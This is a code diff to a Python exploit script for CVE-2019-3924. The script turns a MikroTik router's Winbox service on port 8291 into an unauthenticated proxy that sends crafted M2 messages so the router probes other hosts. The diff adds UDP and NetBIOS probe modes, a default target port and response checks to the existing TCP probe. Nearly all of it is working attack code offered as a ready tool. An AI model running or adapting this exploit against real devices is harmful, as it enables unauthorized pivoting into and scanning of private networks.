@@ -1,5 +1,8 @@
 #!/usr/bin/env python3
 
+# https://www.tenable.com/cve/CVE-2019-3924
+# https://www.tenable.com/security/research/tra-2019-07
+
 import argparse, struct, socket, hashlib, time
 from binascii import *
 from codecs import decode
@@ -147,7 +150,7 @@ def m2_bytes(keywords):
 		result += (code_bytes + type_bytes + size_bytes + value_bytes)
 	return result
 
-def mt_proxy_request(host, port, send1, recv1):
+def mt_tcp_probe(host, port, send, receive):
 	m2 = []
 	m2.append((MT_RECEIVER, MT_ARRAY, [0x68]))
 	m2.append((MT_COMMAND, MT_BYTE, 1))
@@ -155,10 +158,33 @@ def mt_proxy_request(host, port, send1, recv1):
 	m2.append((MT_REPLY_EXPECTED, MT_BOOL, True))
 	m2.append((3, MT_DWORD, ip2dword(host)))
 	m2.append((4, MT_DWORD, port))
-	if send1 != '':
-		m2.append((7, MT_STRING, send1))
-	if recv1 != '':
-		m2.append((8, MT_STRING, recv1))
+	if send != '':
+		m2.append((7, MT_STRING, send))
+	if receive != '':
+		m2.append((8, MT_STRING, receive))
+	return m2_header(m2_bytes(m2))
+
+def mt_udp_probe(host, port, send, receive):
+	m2 = []
+	m2.append((MT_RECEIVER, MT_ARRAY, [0x68]))
+	m2.append((MT_COMMAND, MT_BYTE, 2))
+	m2.append((MT_REQUEST_ID, MT_BYTE, 1))
+	m2.append((MT_REPLY_EXPECTED, MT_BOOL, True))
+	m2.append((3, MT_DWORD, ip2dword(host)))
+	m2.append((4, MT_DWORD, port))
+	if send != '':
+		m2.append((7, MT_STRING, send))
+	if receive != '':
+		m2.append((8, MT_STRING, receive))
+	return m2_header(m2_bytes(m2))
+
+def mt_netbios_probe(host):
+	m2 = []
+	m2.append((MT_RECEIVER, MT_ARRAY, [0x68]))
+	m2.append((MT_COMMAND, MT_BYTE, 3))
+	m2.append((MT_REQUEST_ID, MT_BYTE, 1))
+	m2.append((MT_REPLY_EXPECTED, MT_BOOL, True))
+	m2.append((3, MT_DWORD, ip2dword(host)))
 	return m2_header(m2_bytes(m2))
 
 def get_value(data, a_code, a_type):
@@ -194,10 +220,18 @@ def do(proxy_host, proxy_port, target_host, target_port, send, receive):
 		s.connect((proxy_host, int(proxy_port)))
 		print('[+] Connected to %s:%s' % (proxy_host, proxy_port))
 	except:
-		print('[-] Cannot connect to %s:%s' % (proxy_host, proxy_port))
+		print('[-] Could not connect to %s:%s' % (proxy_host, proxy_port))
 		s.close()
 		return EXIT_ERROR
-	request = mt_proxy_request(target_host, target_port, send, receive)
+	if netbios:
+		request = mt_netbios_probe(target_host)
+		print('[+] Set NetBIOS probe mode for %s' % target_host)
+	elif udp:
+		request = mt_udp_probe(target_host, target_port, send, receive)
+		print('[+] Set UDP probe mode for %s:%s' % (target_host, target_port))
+	else:
+		request = mt_tcp_probe(target_host, target_port, send, receive)
+		print('[+] Set TCP probe mode for %s:%s' % (target_host, target_port))
 	if DEBUG:
 		print('>>>', hexlify(request).decode('UTF-8'), '\n')
 		print('M2 parse of the request:')
@@ -212,7 +246,11 @@ def do(proxy_host, proxy_port, target_host, target_port, send, receive):
 		return EXIT_ERROR
 	try:
 		read = s.recv(1024)
-		print('[+] Response read from %s:%s completed' % (proxy_host, proxy_port))
+		if len(read) > 0:
+			print('[+] Response read from %s:%s completed' % (proxy_host, proxy_port))
+		else:
+			print('[-] Response from %s:%s is zero bytes' % (proxy_host, proxy_port))
+			return EXIT_ERROR
 	except:
 		print('[-] Response read from %s:%s failed' % (proxy_host, proxy_port))
 		s.close()
@@ -240,23 +278,36 @@ DEBUG = False
 proxy_port = 8291
 send = ''
 receive = ''
+udp = False
+netbios = False
+target_port = 80
 
 if __name__ == '__main__':
 	parser = argparse.ArgumentParser(description='description')
 	parser.add_argument('-X', '--proxy-host', help = 'A proxy host IP address to connect to', required = True)
 	parser.add_argument('-P', '--proxy-port', help = 'A proxy winbox port number to connect to (default = 8291)', required = False)
 	parser.add_argument('-t', '--target-host', help = 'A target host address to make a TCP-probe to', required = True)
-	parser.add_argument('-p', '--target-port', help = 'A target TCP port to make a probe to', required = True)
+	parser.add_argument('-p', '--target-port', help = 'A target TCP port to make a probe to (default = 80)', required = False)
 	parser.add_argument('-s', '--send', help = 'A request data to send to the target', required = False)
 	parser.add_argument('-r', '--receive', help = 'A regexp to match the response data', required = False)
+	parser.add_argument('-u', '--udp', action = 'store_true', help = 'Use UDP probe instead of TCP', required = False)
+	parser.add_argument('--netbios', action = 'store_true', help = 'Use NetBIOS probe', required = False)
 	parser.add_argument('--debug', action = 'store_true', help = 'Display the debugging info', required = False)
 	args = vars(parser.parse_args())
 
+	if args['udp']:
+		udp = True
+	if args['netbios']:
+		if udp:
+			print('Error: please don''t use both udp and netbios modes')
+			exit(EXIT_UNKNOWN)
+		netbios = True
 	proxy_host = args['proxy_host']
 	if args['proxy_port']:
 		proxy_port = int(args['proxy_port'])
 	target_host = args['target_host']
-	target_port = int(args['target_port'])
+	if args['target_port']:
+		target_port = int(args['target_port'])
 	if args['send']:
 		send = decode(args['send'], 'unicode_escape')
 	if args['receive']:
